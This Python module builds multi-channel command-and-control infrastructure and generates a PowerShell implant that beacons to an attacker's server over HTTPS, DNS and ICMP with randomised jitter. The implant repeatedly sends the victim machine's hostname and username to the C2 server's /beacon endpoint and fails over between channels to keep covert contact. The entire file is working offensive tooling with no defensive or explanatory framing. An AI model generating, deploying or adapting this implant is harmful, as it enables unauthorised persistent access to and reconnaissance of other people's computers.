#!/usr/bin/env python3
"""
Command and Control Setup Module
Multi-channel C2 with automatic failover
"""

from typing import Dict, List
from dataclasses import dataclass


@dataclass
class C2Channel:
    """Represents a single C2 communication channel"""
    name: str
    channel_type: str
    server: str
    beacon_interval: int
    jitter: int = 0
    priority: int = 1  # 1=primary, 2=fallback1, 3=fallback2


class C2Manager:
    """
    Manages multi-channel C2 infrastructure
    Provides redundancy and automatic failover
    """
    
    def __init__(self, c2_server: str):
        """
        Initialize C2 manager
        
        Args:
            c2_server: Primary C2 server address
        """
        self.c2_server = c2_server
        self.channels = self._initialize_channels()
    
    def _initialize_channels(self) -> List[C2Channel]:
        """Initialize default C2 channels"""
        return [
            C2Channel(
                name="Primary HTTPS",
                channel_type="HTTPS",
                server=f"https://{self.c2_server}:443",
                beacon_interval=300,  # 5 minutes
                jitter=30,            # +/- 30 seconds
                priority=1
            ),
            C2Channel(
                name="Fallback DNS",
                channel_type="DNS",
                server=self.c2_server,
                beacon_interval=600,  # 10 minutes
                jitter=60,
                priority=2
            ),
            C2Channel(
                name="Fallback ICMP",
                channel_type="ICMP",
                server=self.c2_server,
                beacon_interval=900,  # 15 minutes
                jitter=120,
                priority=3
            )
        ]
    
    def get_primary_channel(self) -> C2Channel:
        """Get primary C2 channel"""
        return [c for c in self.channels if c.priority == 1][0]
    
    def get_fallback_channels(self) -> List[C2Channel]:
        """Get all fallback channels"""
        return [c for c in self.channels if c.priority > 1]
    
    def get_all_channels(self) -> List[C2Channel]:
        """Get all configured channels"""
        return sorted(self.channels, key=lambda x: x.priority)
    
    def generate_agent_config(self, session_id: str) -> Dict:
        """
        Generate agent configuration for multi-channel C2
        
        Args:
            session_id: Unique session identifier
            
        Returns:
            Dictionary with complete C2 configuration
        """
        config = {
            'session_id': session_id,
            'channels': []
        }
        
        for channel in self.get_all_channels():
            channel_config = {
                'name': channel.name,
                'type': channel.channel_type,
                'server': channel.server,
                'beacon_interval': channel.beacon_interval,
                'priority': channel.priority
            }
            
            if channel.jitter > 0:
                channel_config['jitter'] = channel.jitter
            
            config['channels'].append(channel_config)
        
        return config
    
    def generate_powershell_agent(self, session_id: str) -> str:
        """
        Generate PowerShell C2 agent code
        
        Args:
            session_id: Unique session identifier
            
        Returns:
            PowerShell script for multi-channel C2 agent
        """
        primary = self.get_primary_channel()
        fallbacks = self.get_fallback_channels()
        
        script = f"""
# Multi-Channel C2 Agent
# Session: {session_id}

$global:SessionID = "{session_id}"
$global:CurrentChannel = "Primary"

# Channel Configuration
$C2Config = @{{
    Primary = @{{
        Type = "{primary.channel_type}"
        Server = "{primary.server}"
        Beacon = {primary.beacon_interval}
        Jitter = {primary.jitter}
    }}
"""
        
        for i, fallback in enumerate(fallbacks, 1):
            script += f"""
    Fallback{i} = @{{
        Type = "{fallback.channel_type}"
        Server = "{fallback.server}"
        Beacon = {fallback.beacon_interval}
        Jitter = {fallback.jitter}
    }}
"""
        
        script += """
}

function Get-RandomJitter {
    param([int]$Jitter)
    return Get-Random -Minimum (-$Jitter) -Maximum $Jitter
}

function Send-Beacon {
    param(
        [string]$Channel,
        [hashtable]$Config
    )
    
    $jitter = Get-RandomJitter -Jitter $Config.Jitter
    $actualInterval = $Config.Beacon + $jitter
    
    try {
        switch ($Config.Type) {
            "HTTPS" {
                $response = Invoke-WebRequest -Uri "$($Config.Server)/beacon" -Method POST -Body @{
                    session_id = $global:SessionID
                    hostname = $env:COMPUTERNAME
                    user = $env:USERNAME
                } -UseBasicParsing -TimeoutSec 10
                
                if ($response.StatusCode -eq 200) {
                    return $true
                }
            }
            "DNS" {
                # DNS-based beacon
                $query = "$global:SessionID.$($Config.Server)"
                Resolve-DnsName -Name $query -ErrorAction SilentlyContinue
                return $true
            }
            "ICMP" {
                # ICMP-based beacon
                Test-Connection -ComputerName $Config.Server -Count 1 -Quiet
                return $true
            }
        }
    } catch {
        Write-Host "[!] $Channel beacon failed: $_"
        return $false
    }
    
    return $false
}

function Start-C2Agent {
    Write-Host "[*] Starting C2 Agent - Session: $global:SessionID"
    
    while ($true) {
        $success = $false
        
        # Try primary channel
        Write-Host "[*] Attempting primary channel..."
        $success = Send-Beacon -Channel "Primary" -Config $C2Config.Primary
        
        if ($success) {
            $global:CurrentChannel = "Primary"
            Start-Sleep -Seconds ($C2Config.Primary.Beacon + (Get-RandomJitter -Jitter $C2Config.Primary.Jitter))
            continue
        }
        
        # Try fallback channels
        for ($i = 1; $i -le 2; $i++) {
            Write-Host "[*] Attempting fallback channel $i..."
            $fallbackKey = "Fallback$i"
            $success = Send-Beacon -Channel $fallbackKey -Config $C2Config.$fallbackKey
            
            if ($success) {
                $global:CurrentChannel = $fallbackKey
                Start-Sleep -Seconds ($C2Config.$fallbackKey.Beacon + (Get-RandomJitter -Jitter $C2Config.$fallbackKey.Jitter))
                break
            }
        }
        
        if (-not $success) {
            Write-Host "[!] All channels failed, waiting 60s before retry..."
            Start-Sleep -Seconds 60
        }
    }
}

# Start the agent
Start-C2Agent
"""
        
        return script
    
    def get_channel_summary(self) -> Dict:
        """Get summary of C2 channel configuration"""
        return {
            'total_channels': len(self.channels),
            'primary': {
                'type': self.get_primary_channel().channel_type,
                'server': self.get_primary_channel().server,
                'beacon': f"{self.get_primary_channel().beacon_interval}s"
            },
            'fallbacks': [
                {
                    'type': fb.channel_type,
                    'server': fb.server,
                    'beacon': f"{fb.beacon_interval}s"
                }
                for fb in self.get_fallback_channels()
            ]
        }
